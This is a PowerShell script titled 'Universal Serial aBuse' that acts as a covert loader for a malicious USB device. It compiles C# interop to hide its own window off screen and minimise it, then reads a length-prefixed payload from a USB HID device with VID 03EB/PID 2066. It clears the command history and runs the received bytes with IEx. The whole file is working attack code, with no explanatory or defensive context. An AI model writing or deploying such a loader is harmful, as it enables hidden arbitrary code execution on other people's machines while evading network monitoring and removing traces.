$ui = $Host.UI.RawUI
$ui.BackgroundColor = 'Black'
$ui.ForegroundColor = 'White'
Clear

$ui.WindowTitle = 'Universal Serial aBuse'
$M = 64
$cs = '
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace n {
	public class w {
		[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
		public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
		[DllImport(%user32.dll%)]
		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
		[DllImport(%user32.dll%)]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		public static FileStream o(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
'.Replace('%',[char]34)
Add-Type -TypeDefinition $cs
$h = (Get-Process -Id $pid).MainWindowHandle
[n.w]::SetWindowPos($h, -2, 2000, 2000, 40, 40, 5)

function stage() {
	$null = [n.w]::ShowWindowAsync($h, 6)
	$devs = gwmi Win32_USBControllerDevice
	foreach ($dev in $devs) {
		$wmidev = [wmi]$dev.Dependent
		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
		}
	}
	try {
		$f = [n.w]::o($fn)
		$g = $e = 0
		$s = New-Object IO.MemoryStream
		do {
			$b = New-Object Byte[] ($M+1)
			$f.Write($b, 0, $M+1)
			$r = $f.Read($b, 0, $M+1)
			if ($b[1] -gt 0) {
				$s.Write($b, 2, $b[1])
				$g+=$b[1]
				[System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
				$a=$s.ToArray()
				if ($e -eq 0 -and $g -gt 2) {
					$e=($a[0]*256)+$a[1]
				}
			}
		} while ($g -lt $e+2 -or $e -eq 0)
		clhy
		IEx ([Text.Encoding]::ASCII).GetString($a,2,$e)
	} catch {
		echo $_.Exception|format-list -force
	}
	exit
}
stage

